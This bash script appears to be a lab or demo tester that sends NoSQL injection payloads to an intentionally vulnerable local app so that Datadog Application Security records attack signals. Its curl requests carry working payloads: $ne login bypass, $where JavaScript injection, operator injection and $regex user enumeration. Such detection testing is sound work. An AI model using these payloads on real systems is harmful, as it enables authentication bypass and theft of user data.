#!/bin/bash

# NoSQL Injection Vulnerability Testing Script
# This script tests the intentional vulnerabilities in the application

API_URL="http://localhost:5000"
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[1;33m'
COLOR_BLUE='\033[0;34m'
COLOR_NC='\033[0m' # No Color

echo "╔══════════════════════════════════════════════════════════╗"
echo "║   NoSQL Injection Vulnerability Testing Script          ║"
echo "║   ⚠️  Testing INTENTIONAL vulnerabilities                ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# Test 1: User Search Injection
echo -e "${COLOR_BLUE}[TEST 1]${COLOR_NC} User Search Injection"
echo -e "${COLOR_YELLOW}Attack:${COLOR_NC} Listing all users with \$ne operator"
curl -s "${API_URL}/api/vulnerable/search-user?username[\$ne]=null" | jq '.'
echo ""
echo "---"
echo ""

# Test 2: Authentication Bypass
echo -e "${COLOR_BLUE}[TEST 2]${COLOR_NC} Authentication Bypass"
echo -e "${COLOR_YELLOW}Attack:${COLOR_NC} Bypassing password check"
curl -s -X POST "${API_URL}/api/vulnerable/insecure-login" \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "password": {"$ne": null}}' | jq '.'
echo ""
echo "---"
echo ""

# Test 3: JavaScript Injection via $where
echo -e "${COLOR_BLUE}[TEST 3]${COLOR_NC} JavaScript Injection (\$where)"
echo -e "${COLOR_YELLOW}Attack:${COLOR_NC} Executing arbitrary JavaScript"
curl -s "${API_URL}/api/vulnerable/search-movies-where?title=1;%20return%20true;%20//" | jq '.'
echo ""
echo "---"
echo ""

# Test 4: Query Operator Injection
echo -e "${COLOR_BLUE}[TEST 4]${COLOR_NC} Query Operator Injection"
echo -e "${COLOR_YELLOW}Attack:${COLOR_NC} Extracting all movies with price manipulation"
curl -s "${API_URL}/api/vulnerable/movies-by-price?minPrice[\$gt]=0&maxPrice[\$lt]=999999" | jq '.'
echo ""
echo "---"
echo ""

# Test 5: User Enumeration
echo -e "${COLOR_BLUE}[TEST 5]${COLOR_NC} User Enumeration via Regex"
echo -e "${COLOR_YELLOW}Attack:${COLOR_NC} Finding users starting with 'a'"
curl -s "${API_URL}/api/vulnerable/user-exists?email[\$regex]=^a" | jq '.'
echo ""
echo "---"
echo ""

# Test 6: Test endpoint
echo -e "${COLOR_BLUE}[TEST 6]${COLOR_NC} Vulnerability Information"
echo -e "${COLOR_YELLOW}Fetching:${COLOR_NC} List of all vulnerable endpoints"
curl -s "${API_URL}/api/vulnerable/test-vulnerable" | jq '.'
echo ""
echo "---"
echo ""

echo -e "${COLOR_GREEN}✓ Testing complete!${COLOR_NC}"
echo ""
echo "Check your Datadog Application Security dashboard at:"
echo "https://app.datadoghq.com/security/appsec"
echo ""
echo "You should see:"
echo "  • Security signals for NoSQL injection"
echo "  • User tracking information"
echo "  • Attack patterns and traces"
echo ""
